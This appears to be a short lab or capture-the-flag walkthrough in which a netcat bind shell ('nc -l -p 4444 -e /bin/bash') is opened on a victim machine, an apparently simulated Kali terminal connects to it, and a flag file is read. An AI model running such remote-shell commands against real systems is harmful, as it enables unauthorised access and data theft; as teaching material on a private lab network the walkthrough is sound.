Step 1: Victim sets up listener with `nc -l -p 4444 -e /bin/bash`  
Step 2: Attacker connects with `nc 192.168.56.210 4444`  
Step 3: Shell access established - commands run on victim machine

```text

Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ nc -l -p 4444 -e /bin/bash
Listening on [0.0.0.0] (family 0, port 4444)
victim@target:~$

```  

```text
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.
pentester@kali-linux:~$ nc 192.168.56.210 4444
Connection to 192.168.56.210 port 4444 [tcp/*] succeeded!
Bind shell established. You can now run commands on the victim machine.

Available commands: id, whoami, pwd, ls, cat, ifconfig, uname, ps, netstat, exit

Type 'exit' to close the shell connection.
victim@192.168.56.210:$ ls
Desktop  Documents  Downloads  Pictures  Videos  secret.txt
victim@192.168.56.210:$ cat secret.txt
FLAG{netcat_bind_shell_success}
victim@192.168.56.210:$ whoami
victim
victim@192.168.56.210:$
```